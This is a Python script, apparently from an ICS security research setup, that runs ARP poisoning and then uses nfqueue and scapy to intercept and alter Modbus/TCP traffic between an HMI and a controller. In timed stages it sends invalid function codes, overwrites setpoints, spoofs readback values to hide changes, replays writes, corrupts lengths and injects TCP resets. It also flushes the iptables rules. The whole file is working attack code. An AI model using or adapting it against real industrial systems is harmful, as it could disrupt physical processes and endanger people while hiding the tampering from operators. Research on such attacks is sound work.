#!/usr/bin/python2
#---------------------------------------------------------------------------------------------------------------------------------------------#
"""
    Use scapy to modify packets going through your machine.
    Based on nfqueue to block packets in the kernel and pass them to scapy for validation
"""
#---------------------------------------------------------------------------------------------------------------------------------------------#
#importing
import nfqueue
from scapy.all import *
import os
load_contrib('modbus')
import time
from threading import Thread   
#---------------------------------------------------------------------------------------------------------------------------------------------#
# All packets that should be filtered :
iptablesr = "sudo iptables -A OUTPUT -j NFQUEUE --queue-num 1"
print("Adding iptable rules :")
print(iptablesr)
os.system(iptablesr)
#---------------------------------------------------------------------------------------------------------------------------------------------#
# If you want to use it for MITM attacks, set ip_forward=1 :
print("Set ipv4 forward settings : ")
os.system("sysctl net.ipv4.ip_forward=1")
#---------------------------------------------------------------------------------------------------------------------------------------------#
#initializing flags
flag = False
flag2 = False
flag3= False
#---------------------------------------------------------------------------------------------------------------------------------------------#
#initializing counters
callbackcount=0
count=0
stabilizationCount=0
pktCount=0
t_end=time.time()+60 #one minute execution for each stage
#---------------------------------------------------------------------------------------------------------------------------------------------#
def changeFuncCode(payload):
    print('changeFuncCode attack')
    global ON
    data = payload.get_data()
    pkt = IP(data)
      
    if pkt.src == "192.168.0.2" and pkt.dst == "192.168.0.5":
	try:	
		if(pkt[TCP].funcCode):
			pkt[TCP].funcCode=88 #change the function code to an invalid one
		del pkt[TCP].chksum
		del pkt[IP].chksum
		payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
	except:	
		payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))

    else:
        # Let the rest go it's way
        payload.set_verdict(nfqueue.NF_ACCEPT)
#---------------------------------------------------------------------------------------------------------------------------------------------#
def stabilize(payload):
# Here is where the magic happens.
    print('stabilization')
    global ON
    global stabilizationCount
    data = payload.get_data()
    pkt = IP(data)
    repPkt2= [0x4049, 0x0, 0x0, 0x0, 0x4020, 0x0, 0x0, 0x0, 0x3fd9, 0x9999, 0x9999, 0x999a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4049, 0x0, 0x0, 0x0, 0xbff0, 0x0, 0x0, 0x0, 0x3fe0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4049, 0x0, 0x0, 0x0]

    if pkt.src == "192.168.0.2" and pkt.dst == "192.168.0.5": #100 is suppose to be the HMI PC (INITIALLY WAS .2)
	try:
		if(pkt[TCP].outputsValue and pkt[TCP].funcCode==0x10):
			if(stabilizationCount==0):
				stabilizationCount=stabilizationCount+1
				pkt[TCP].outputsValue = repPkt2	
				del pkt[TCP].chksum
				del pkt[IP].chksum
				payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
			elif(stabilizationCount==1):
				os.system('xterm -e kill -TERM $(pgrep -f arp.py)')
			else:
				print('you should not be here :O')
		else:
			payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
	except:
		payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
    else:
    	   # Let the rest go it's way
    	payload.set_verdict(nfqueue.NF_ACCEPT)
#---------------------------------------------------------------------------------------------------------------------------------------------#
def modification(payload):
	print('Modification attack')
	global pktCount
	global ON
	if(pktCount==0): #to run arp spoofing in a different thread without stopping the functionality of the main script
		thread=threading.Thread(target=arp)
		thread.start()
		pktCount=pktCount+1

	data = payload.get_data()    
	pkt = IP(data)
	if pkt.src == "192.168.0.2" and pkt.dst == "192.168.0.5":
		try:
			
			if(pkt[TCP].outputsValue and pkt[TCP].funcCode==0x10): # targetting the write values 
				a=[]
				for i in range(len(pkt[TCP].outputsValue)-4,len(pkt[TCP].outputsValue),1):
					a.append(pkt[TCP].outputsValue[i])
					pkt[TCP].outputsValue[i] = 0
			global switchValue			
			if(pkt[TCP].outputsValue and pkt[TCP].funcCode==0xf):
				switchValue=pkt[TCP].outputsValue
				pkt[TCP].outputsValue=0 #to ensure that the Contoller sees the manual mode
		
			del pkt[TCP].chksum
			del pkt[IP].chksum
			payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
		except:	
			payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))

	if pkt.src == "192.168.0.5" and pkt.dst == "192.168.0.2":
		try:
			if(pkt[TCP].funcCode==0x2 and pkt[TCP].inputStatus==[0]):
				global switchValue			
				pkt[TCP].inputStatus=switchValue

			elif(pkt[TCP].registerVal and pkt[TCP].funcCode==0x4):
				global a
				if(pkt[TCP].byteCount==24):
					pkt[TCP].registerVal= pkt[TCP].registerVal[:-8]+a+pkt[TCP].registerVal[-4:]
				else:
					pkt[TCP].registerVal= pkt[TCP].registerVal[:-4]+a
			
			del pkt[TCP].chksum
			del pkt[IP].chksum
			payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
		except:
			payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
	
    	else:
        	# Let the rest go it's way
		payload.set_verdict(nfqueue.NF_ACCEPT)
#---------------------------------------------------------------------------------------------------------------------------------------------#
def replay(payload):
    print('Replay attack')
    global ON
    data = payload.get_data()
    pkt = IP(data)
    if pkt.src == "192.168.0.2" and pkt.dst == "192.168.0.5":
	try:
			
		if(pkt[TCP].outputsValue and pkt[TCP].funcCode==0x10):
			if(count==0):
				global repPkt
				repPkt = pkt[TCP].outputsValue
				global count
				count = count+1
			global repPkt
			global OriginalPayload
			OriginalPayload=pkt[TCP].outputsValue 
			pkt[TCP].outputsValue = repPkt	
     
		global switchValue			
		if(pkt[TCP].outputsValue and pkt[TCP].funcCode==0xf):
			switchValue=pkt[TCP].outputsValue
			pkt[TCP].outputsValue=0 #to ensure that the Contoller sees the manual mode

		del pkt[TCP].chksum
		del pkt[IP].chksum
		payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
	except:
		payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
    if pkt.src == "192.168.0.5" and pkt.dst == "192.168.0.2":
	try:
		if(pkt[TCP].funcCode==0x2 and pkt[TCP].inputStatus==[0]):
			global switchValue			
			pkt[TCP].inputStatus=switchValue
		elif(pkt[TCP].registerVal and pkt[TCP].funcCode==0x4):
			if(pkt[TCP].byteCount==88):
				global OriginalPayload
				pkt[TCP].registerVal= OriginalPayload
		
		del pkt[TCP].chksum
		del pkt[IP].chksum
		payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
	except:
		payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))

    else:
        # Let the rest go it's way
        payload.set_verdict(nfqueue.NF_ACCEPT)
#---------------------------------------------------------------------------------------------------------------------------------------------#
def changePktLen(payload):
 
    print('changePktLen attack')
    global ON
    data = payload.get_data()
    pkt = IP(data)

    if pkt.src == "192.168.0.2" and pkt.dst == "192.168.0.5":
	try:
			
		if (pkt[TCP].len==6):
			pkt[TCP].len = 3 #this returns an exception from the controller
			#saying that it is illegal data value-->exception code is 3
		del pkt[TCP].chksum
		del pkt[IP].chksum
		payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
	except:	
		payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
    else:
        # Let the rest go it's way
	payload.set_verdict(nfqueue.NF_ACCEPT)
#---------------------------------------------------------------------------------------------------------------------------------------------#
def tcpReset(payload):
    print('tcpReset attack')
    global ON
    data = payload.get_data()
    pkt = IP(data)
    if pkt.src == "192.168.0.2" and pkt.dst == "192.168.0.5":
	try:	
		pkt[TCP].flags='R' #set the reset flag
		del pkt[TCP].chksum
		del pkt[IP].chksum
		payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
	except:	
		payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))

    else:
        # Let the rest go it's way
        payload.set_verdict(nfqueue.NF_ACCEPT)
#---------------------------------------------------------------------------------------------------------------------------------------------#
def callback(payload): #for directing packets based on the time
	global flag
	global flag2
	global flag3
	global t_end
	global callbackcount
	if(time.time()<t_end):
		if(flag==False and flag2==False and flag3==False):
 			changeFuncCode(payload)
		elif(flag==False and flag2==False and flag3==True):
			stabilize(payload)
		elif(flag==False and flag2==True and flag3==False):
			modification(payload)
		elif(flag==False and flag2==True and flag3==True):
			replay(payload)
		elif(flag==True and flag2==False and flag3==False):
			changePktLen(payload)	
		else:
			tcpReset(payload)
	else:
		if(callbackcount==0): #stabilization
			t_end=time.time()+60
			flag3=True
			callbackcount=callbackcount+1
		elif(callbackcount==1): #modification
			t_end=time.time()+60
			flag2=True
			flag3=False
			callbackcount=callbackcount+1
		elif(callbackcount==2): #replay
			t_end=time.time()+60
			flag3=True
			callbackcount=callbackcount+1
		elif(callbackcount==3): #changePktLen
			t_end=time.time()+60
			flag=True
			flag2=False
			flag3=False
			callbackcount=callbackcount+1
		elif(callbackcount==4): #tcpReset
			t_end=time.time()+60
			flag3=True
			callbackcount=callbackcount+1
		else:
			print("Flushing iptables.") #terminating the script by killing threads
			os.system('iptables -F')
        		os.system('iptables -X')
			os.system('xterm -e kill -TERM $(pgrep -f arp.py)')
			os.system('kill -9 $(pgrep -f ModbusPaperScript.py)')
#---------------------------------------------------------------------------------------------------------------------------------------------#
def arp():
	os.system("xterm -e python arp.py") #calling an external script to run the arp poisoning in a seperate terminal window
#---------------------------------------------------------------------------------------------------------------------------------------------#
def main():
    # This is the intercept
    q = nfqueue.queue()
    q.open()
    q.bind(socket.AF_INET)
    q.set_callback(callback)
    q.create_queue(1) #packets are added to queue number 1

    try:
	print('Running the queue')
	q.try_run() # Main loop--running the queue

    except KeyboardInterrupt:
        q.unbind(socket.AF_INET)
        q.close()
        print("Flushing iptables.")
        # This flushes everything, you might wanna be careful
        os.system('iptables -F')
        os.system('iptables -X')
#---------------------------------------------------------------------------------------------------------------------------------------------#
if __name__ == "__main__":
	#starting the thread that runs the arp poisoning in a different terminal window
	thread=threading.Thread(target=arp)
	thread.start()
	#calling the main funciton
	main()
#---------------------------------------------------------------------------------------------------------------------------------------------#
